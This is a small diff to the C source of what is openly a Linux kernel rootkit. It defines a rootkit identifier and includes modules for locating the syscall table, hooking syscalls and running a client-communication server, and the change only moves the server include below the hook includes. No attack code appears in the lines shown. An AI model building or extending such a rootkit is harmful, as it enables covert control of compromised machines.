@@ -11,10 +11,10 @@ static int BUFFER_SIZE = 2048;
 static char ROOTKIT_ID[] =  "Y&&U3im9Y2jk";
 
 #include "includes/log.c" //functions for file I/O and for
-#include "includes/server.c" //functions to run server and communicate with client
 #include "includes/syscall_table.c" //functions for getting sycall syscall_table
 #include "includes/hooks.c" //functions for hooking syscalls
 #include "includes/hooked_syscalls.c" //functions of the hooked syscalls
+#include "includes/server.c" //functions to run server and communicate with client
 
 static int __init ModuleInit(void);
 static void __exit ModuleExit(void);
